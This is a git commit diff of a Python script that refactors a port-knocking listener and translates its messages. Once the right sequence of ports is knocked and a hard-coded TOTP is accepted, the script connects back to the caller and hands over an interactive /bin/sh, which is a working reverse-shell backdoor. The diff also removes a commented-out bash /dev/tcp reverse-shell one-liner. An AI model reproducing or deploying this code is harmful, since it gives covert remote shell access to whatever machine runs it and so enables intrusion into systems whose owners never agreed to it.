f292a1ad31897f0e0f64c86bdac097f0d1409f75
Rafael <rafaelpfranca73@gmail.com>
2020-10-10 02:04:57 -0300

    Refactor the while logic in main and customize some prints

--- script.py
+++ script.py
@@ -9,26 +9,25 @@ import os
 
 
 def port_knocking(ports, timeout):
-  """ Monitor connections on specific ports, if the Port Knocking is completed ... """
+  """Monitor connections on pre-configured ports. This function ends if the Port Knocking is completed."""
 
-  my_socket = psocket.SocketHndl(iface_name=None)
-  current_port = current_time = 0
+  my_socket = psocket.SocketHndl(iface_name=None, timeout=60)
+  port_count = current_time = 0
 
-  while (current_port < len(ports)):
-    bts = my_socket.recv()
-    pkt = ethernet.Ethernet(bts)
+  while (port_count < len(ports)):
+    bts = my_socket.recv()                # receveing bytes
+    pkt = ethernet.Ethernet(bts)          # getting the packet
 
-    if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[current_port]): 
-      if ((current_port != 0) and (time() - current_time > timeout)):
-        current_port = current_time = 0
+    if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[port_count]):
+      if ((port_count != 0) and (time() - current_time > timeout)):   
+        port_count = current_time = 0     # if the timeout is reached, restart
       else:
-        print ("Recebeu!")
-        current_port += 1
+        port_count += 1
         current_time = time()
 
 
 def check_OTP(port_otp):
-  """ Open specific port to receive OTP password """
+  """Open specific port to receive OTP password."""
 
   otp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   otp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
@@ -40,14 +39,14 @@ def check_OTP(port_otp):
 
   totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')
   if (totp.verify(client_value)):
-    print("Aceito!")
+    print("[+] A shell will be sent to your listening port!")
     return client[0]
   else:
-    print("Rejeitado!")
+    print("[-] Wrong one-time password!")
 
 
 def reverse_shell(client_ip, port_reverse_shell):
-  """ Send shell to client """
+  """Send shell after successful port knocking and otp."""
 
   shell_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   shell_socket.connect((client_ip, port_reverse_shell))
@@ -56,18 +55,16 @@ def reverse_shell(client_ip, port_reverse_shell):
   os.dup2(shell_socket.fileno(),2)
   subprocess.call(["/bin/sh","-i"])
 
-  # command = "bash -i >& /dev/tcp" + cliente[0] + "/12345 0>&1"
-  # subprocess.run(command.split(), shell = True, check = True) 
-
 
 if __name__ == '__main__':
-  while 1:
+  input_config = 1
+  while input_config:
     try:
       ports_list = [int(x) for x in input("Type ports sequence (e.g. 12345 1337 5000): ").split()]
       timeout = int(input("Timeout (in seconds) between each port connection: "))
       port_otp = int(input("Type the port that will receive the OTP value: "))
       port_reverse_shell = int(input("Type the port that will receive the reverse shell: "))
-      break
+      input_config = 0
     except ValueError:
       print ("\nERROR! Incorrect value type!")
 
